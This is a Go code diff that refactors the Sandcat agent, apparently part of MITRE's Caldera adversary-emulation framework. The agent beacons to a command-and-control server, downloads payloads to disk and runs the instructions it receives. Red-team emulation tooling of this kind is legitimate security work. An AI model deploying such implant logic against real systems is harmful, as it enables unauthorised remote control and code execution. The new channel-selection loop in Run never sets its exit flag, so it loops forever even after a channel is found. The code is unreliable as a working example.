@@ -3,21 +3,21 @@ package agent
 import (
 	"encoding/json"
 	"fmt"
+	"path/filepath"
 	"os"
 	"os/exec"
 	"os/user"
-	"path/filepath"
 	"reflect"
 	"runtime"
 	"time"
 
 	//"github.com/mitre/gocat/privdetect"
-	//"github.com/mitre/gocat/executors/execute"
+	//"github.com/mitre/gocat/execute"
 	//"github.com/mitre/gocat/util"
 	//"github.com/mitre/gocat/contact"
 	//"github.com/mitre/sandcat/gocat/output"
 	"../privdetect"
-	"../executors/execute"
+	"../execute"
 	"../util"
 	"../contact"
 	"../output"
@@ -26,8 +26,8 @@ import (
 type AgentInterface interface {
 	Heartbeat()
 	Beacon() map[string]interface{}
-	Initialize(server string, group string, heartbeatChannel string, beaconChannel string, enableP2pReceivers bool)
-	Run()
+	Initialize(server string, group string, enableP2pReceivers bool)
+	Run(c2Config map[string]string)
 	Terminate()
 	GetFullProfile() map[string]interface{}
 	GetTrimmedProfile() map[string]interface{}
@@ -59,7 +59,7 @@ type Agent struct {
 }
 
 // Set up agent variables.
-func (a *Agent) Initialize(server string, group string, heartbeatMethod string, beaconMethod string, enableP2pReceivers bool) {
+func (a *Agent) Initialize(server string, group string, enableP2pReceivers bool) {
 	host, _ := os.Hostname()
 	user, err := user.Current()
 	if err != nil {
@@ -85,15 +85,13 @@ func (a *Agent) Initialize(server string, group string, heartbeatMethod string, 
 
 	// Paw will get initialized after successful beacon.
 
-	// Will want some additional error checking in the future.
-	a.beaconContact = contact.CommunicationChannels[beaconMethod]
-	a.heartbeatContact = contact.CommunicationChannels[heartbeatMethod]
+	// Will get set when agent starts running.
+	a.beaconContact = nil
+	a.heartbeatContact = nil
 
 	output.VerbosePrint(fmt.Sprintf("server=%s", a.server))
 	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
 	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
-	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", beaconMethod))
-	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", heartbeatMethod))
 	output.VerbosePrint(fmt.Sprintf("allow p2p receivers=%v", a.enableP2pReceivers))
 }
 
@@ -126,11 +124,24 @@ func (a *Agent) GetTrimmedProfile() map[string]interface{} {
 	}
 }
 
-// Runs main loop.
-func (a *Agent) Run() {
+// Establish contact with C2 and run instructions.
+func (a *Agent) Run(c2Config map[string]string) {
+	// Establish communication channels.
+	comsChosen := false
+	for !comsChosen {
+		coms := contact.ChooseCommunicationChannel(a.GetFullProfile(), c2Config)
+		if coms != nil {
+			a.beaconContact = coms
+			a.heartbeatContact = coms
+		} else {
+			util.Sleep(300)
+		}
+	}
+
+	// Start main execution loop.
 	watchdog := 0
 	checkin := time.Now()
-	for {
+	for (util.EvaluateWatchdog(checkin, watchdog)) {
 		// Send beacon and get response.
 		beacon := a.Beacon()
 
@@ -143,12 +154,13 @@ func (a *Agent) Run() {
 			// TODO
 		}
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
+			// Run commands and send results.
 			cmds := reflect.ValueOf(beacon["instructions"])
 			for i := 0; i < cmds.Len(); i++ {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
-				droppedPayloads := a.downloadPayloads(command["payloads"].([]interface{}))
+				droppedPayloads := contact.DownloadPayloads(a.GetTrimmedProfile(), command["payloads"].([]interface{}), a.beaconContact)
 				go a.runInstruction(command, droppedPayloads)
 				util.Sleep(command["sleep"].(float64))
 			}
@@ -159,12 +171,7 @@ func (a *Agent) Run() {
 			} else {
 				util.Sleep(float64(15))
 			}
-			util.EvaluateWatchdog(checkin, watchdog)
 		}
-
-		// Run command if needed
-
-		// Send results if needed
 	}
 }
 
@@ -192,32 +199,12 @@ func (a *Agent) Beacon() map[string]interface{} {
 }
 
 func (a *Agent) Heartbeat() {
-	// TODO
+	// TODO add any heartbeat functionality here.
 }
 
-// Will download each individual payload listed, write them to disk,
-// and will return the full file paths of each downloaded payload.
-func (a *Agent) downloadPayloads(payloads []interface{}) []string {
-	var droppedPayloads []string
-	availablePayloads := reflect.ValueOf(payloads)
-	for i := 0; i < availablePayloads.Len(); i++ {
-		payload := availablePayloads.Index(i).Elem().String()
-		location := filepath.Join(payload)
-		obtainedPayload := false
-		if util.Exists(location) == false {
-			payloadBytes := a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
-			if len(payloadBytes) > 0 {
-				util.WritePayloadBytes(location, payloadBytes)
-				obtainedPayload = true
-			}
-		} else {
-			obtainedPayload = true
-		}
-		if obtainedPayload {
-			droppedPayloads = append(droppedPayloads, location)
-		}
-	}
-	return droppedPayloads
+func (a *Agent) Terminate() {
+	// Add any cleanup/termination functionality here.
+	output.VerbosePrint("[*] Terminating Sandcat Agent... goodbye.")
 }
 
 // Runs a single instruction and send results.
